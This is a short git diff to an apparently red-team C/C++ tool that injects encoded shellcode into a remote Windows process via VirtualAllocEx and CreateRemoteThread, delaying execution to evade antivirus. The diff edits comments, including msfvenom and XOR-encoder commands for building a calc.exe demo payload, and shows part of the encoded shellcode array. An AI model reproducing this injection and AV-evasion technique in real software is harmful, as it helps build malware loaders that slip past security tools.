@@ -1,7 +1,7 @@
 /*
 	Author: @m8r0wn
-	
-	Inject shellcode in a remote process using VirtualAllocEx() / CreateRemoteThread() in a suspended state with protection 
+
+	Injects shellcode into a remote process using VirtualAllocEx() / CreateRemoteThread() in a suspended state with protection
 	PAGE_NOACCESS. Sleeps to avoid AV before modifying protections and calling ResumeThread
 	
 	References:
@@ -19,8 +19,8 @@
 
 int main(int argc, char* argv[]) {
 	
-	// msfvenom -p /windows/x64/exec CMD="calc.exe" -f raw -o shellcode.bin
-	// python3 shellcodeEncoder.py shellcode.bin <key>
+	// msfvenom -p /windows/x64/exec CMD="calc.exe" -f raw -o clac.bin
+	// python3 shellcodeEncoder.py calc.bin -e xor -f cpp
 	char buf[] = "\xaf\x2d\xe0\x96\x95\x9c\x93\x68\x65\x6c\x2d\x32\x2e\x34\x37"
 	"\x02\x33\x2b\x43\xb7\x11\x1b\xe3\x37\x0c\x24\xe8\x3d\x7c\x2d"
 	"\xd8\x37\x43\x3a\xee\x06\x03\x20\x6a\xdb\x26\x29\x22\x55\xac"
